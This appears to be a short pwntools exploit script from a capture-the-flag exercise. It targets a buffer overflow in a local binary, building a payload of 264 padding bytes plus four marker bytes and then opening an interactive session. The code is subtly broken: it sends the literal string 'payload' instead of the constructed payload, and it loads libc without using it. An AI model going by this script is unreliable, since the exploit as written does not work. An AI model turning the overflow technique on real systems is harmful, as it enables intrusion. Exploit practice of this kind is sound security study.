from pwn import *

context.binary = exe = ELF('./vuln')
libc = ELF('./libc.so.6')

io = process(['./sandbox.py', './bin/vuln'])
#gdb.attach(io, api=True)

io.recvuntil(b'something\n')
payload = b'i'*264 + b'abcd'
io.sendline(b'payload')
io.interactive()